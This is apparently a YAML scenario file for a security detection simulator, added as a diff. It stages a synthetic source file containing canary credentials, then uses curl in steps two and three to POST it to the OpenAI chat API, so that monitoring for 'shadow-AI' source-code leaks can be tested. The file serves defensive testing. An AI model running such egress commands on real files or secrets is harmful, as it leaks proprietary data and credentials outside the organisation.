@@ -1,0 +1,117 @@
+scenario_id: SIM-AIACC-001
+name: "AI Access — Source Code Paste to Public ChatGPT"
+version: "1.0"
+status: active
+
+plane: AI_ACCESS
+detection_types:
+  - Analytics
+  - BIOC
+
+uc_ref: UCS-AIACC-01
+tc_ref: TC-AIACC-01
+uc_name: "Shadow-AI Source Code Disclosure"
+tc_name: "Multi-File Source Code Paste to OpenAI ChatGPT API"
+
+mitre_tactic: "TA0010"
+mitre_tactic_name: "Exfiltration"
+mitre_technique: "T1567"
+mitre_technique_name: "Exfiltration Over Web Service"
+additional_techniques:
+  - technique: "T1041"
+    name: "Exfiltration Over C2 Channel"
+
+threat_report: "Unit42 - Shadow AI in the Enterprise"
+threat_report_url: "https://unit42.paloaltonetworks.com/"
+
+execution_identity:
+  default: container-runtime
+  options:
+    - container-runtime
+    - root
+
+push_supported: true
+pull_supported: true
+
+infra_modules_needed:
+  - base
+
+external_tools:
+  - name: curl
+    source: "https://curl.se/"
+    type: binary
+    install_inline: false
+
+steps:
+  - id: step-01
+    name: "Plant a synthetic proprietary source file in /tmp"
+    command: |
+      cat > /tmp/cortexsim_proprietary.py <<'PY'
+      # CORTEXSIM-CANARY: synthetic proprietary file for AI Access detection
+      AWS_ACCESS_KEY_ID = "AKIA0000CORTEXSIMCANARY"
+      DB_CONN = "postgresql://prod-user:CORTEXSIM-CANARY@db.internal:5432/payments"
+      def settle_transactions(rows):
+          return [r for r in rows if r["status"] == "pending"]
+      PY
+      ls -la /tmp/cortexsim_proprietary.py
+    identity: container-runtime
+    mitre_technique: "T1005"
+    expected_detections:
+      - plane: AI_ACCESS
+        type: BIOC
+        description: "Pre-flight: synthetic source file staged with CORTEXSIM-CANARY marker"
+
+  - id: step-02
+    name: "POST source-code as a chat completion to api.openai.com"
+    command: |
+      BODY=$(jq -Rs '{model:"gpt-4o", messages:[{role:"user",content:.}]}' < /tmp/cortexsim_proprietary.py)
+      curl -sS -o /tmp/aiacc-001-resp.json -w 'http=%{http_code}\n' \
+        -X POST https://api.openai.com/v1/chat/completions \
+        -H 'authorization: Bearer sk-cortexsim-canary-NOT-A-REAL-KEY' \
+        -H 'content-type: application/json' \
+        -H 'x-cortexsim-run-id: aiacc-001' \
+        --data "$BODY" || true
+    identity: container-runtime
+    mitre_technique: "T1567"
+    expected_detections:
+      - plane: AI_ACCESS
+        type: Analytics
+        description: "AI Access — outbound POST to api.openai.com containing source-code shape"
+      - plane: AI_ACCESS
+        type: Analytics
+        description: "AI Access — DLP secret regex (AWS access key + DB connection string) in prompt body"
+      - plane: NDR
+        type: Analytics
+        description: "NGFW EAL — large outbound payload to api.openai.com with non-browser User-Agent"
+
+  - id: step-03
+    name: "Repeat egress to confirm stable detection across 3 sessions"
+    command: |
+      for i in 1 2 3; do
+        BODY=$(jq -Rs --arg i "$i" '{model:"gpt-4o", messages:[{role:"user",content:(.+"\nsession="+$i)}]}' < /tmp/cortexsim_proprietary.py)
+        curl -sS -o /dev/null -w "session=$i http=%{http_code}\n" \
+          -X POST https://api.openai.com/v1/chat/completions \
+          -H 'authorization: Bearer sk-cortexsim-canary-NOT-A-REAL-KEY' \
+          -H 'content-type: application/json' \
+          --data "$BODY" || true
+        sleep 5
+      done
+    identity: container-runtime
+    mitre_technique: "T1567"
+    expected_detections:
+      - plane: AI_ACCESS
+        type: Analytics
+        description: "AI Access — repeated POST pattern (3 in <60s) flagged as policy violation"
+
+cleanup:
+  commands:
+    - "rm -f /tmp/cortexsim_proprietary.py /tmp/aiacc-001-resp.json"
+
+author: "Henry Reed"
+created: "2026-05-05"
+last_updated: "2026-05-05"
+tags:
+  - ai-access
+  - shadow-ai
+  - openai
+  - source-code-dlp
